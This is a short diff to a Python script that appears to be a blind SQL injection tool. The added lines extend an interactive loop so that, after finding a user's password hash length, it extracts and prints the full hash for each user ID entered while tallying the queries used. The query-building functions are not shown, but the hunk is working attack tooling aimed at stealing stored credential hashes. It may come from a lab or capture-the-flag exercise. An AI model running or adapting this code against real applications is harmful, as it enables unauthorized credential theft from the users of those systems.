@@ -65,12 +65,16 @@ def total_queries_taken():
   #once printed reset the var
   total_queries = 0 
 
+
+#begin forever loop to extract password hashes from valid users 
 while True:
   try:
     user_id = input("> Enter a User ID to extract a password hash:  ")
     if not invalid_user(user_id):
       user_password_len = password_len(user_id)
       print("\t[-] User {} hash length: {}".format(user_id, user_password_len))
+      total_queries_taken()
+      print("\t [-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_len)))
       total_queries_taken()
     else:
       print("\t\t [X] User {} does not exist".format(user_id)) 
